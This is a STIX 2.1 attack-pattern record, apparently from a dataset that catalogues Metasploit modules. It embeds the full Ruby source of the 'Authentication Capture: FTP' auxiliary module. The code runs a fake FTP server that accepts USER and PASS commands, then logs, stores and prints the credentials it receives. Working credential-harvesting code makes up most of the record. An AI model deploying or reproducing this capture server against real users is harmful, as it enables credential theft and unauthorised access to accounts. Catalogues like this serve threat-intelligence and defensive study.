{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--20dd7ae0-2690-41d6-b9a7-54c26815edf0",
    "created": "2024-08-14T16:22:00.822183Z",
    "modified": "2024-08-14T16:22:00.822187Z",
    "name": "Authentication Capture: FTP",
    "description": " This module provides a fake FTP service that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/ftp.rb",
            "external_id": "ftp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Authentication Capture: FTP',\n      'Description'    => %q{\n          This module provides a fake FTP service that\n        is designed to capture authentication credentials.\n      },\n      'Author'      => ['ddz', 'hdm'],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Capture', 'Description' => 'Run FTP capture server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Capture'\n        ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',  [ true, \"The local port to listen on.\", 21 ]),\n        OptString.new('BANNER', [ true, \"The server banner\",  'FTP Server Ready'])\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {:name => \"#{c.peerhost}:#{c.peerport}\", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}\n    c.put \"220 #{datastore['BANNER']}\\r\\n\"\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n    return if not data\n    cmd,arg = data.strip.split(/\\s+/, 2)\n    arg ||= \"\"\n\n    if(cmd.upcase == \"USER\")\n      @state[c][:user] = arg\n      c.put \"331 User name okay, need password...\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"QUIT\")\n      c.put \"221 Logout\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"PASS\")\n      @state[c][:pass] = arg\n\n      report_cred(\n        ip: @state[c][:ip],\n        port: datastore['SRVPORT'],\n        service_name: 'ftp',\n        user: @state[c][:user],\n        password: @state[c][:pass],\n        proof: arg\n      )\n\n      print_good(\"FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}\")\n    end\n\n    @state[c][:pass] = data.strip\n    c.put \"500 Error\\r\\n\"\n    return\n\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\n\n\nend\n"
}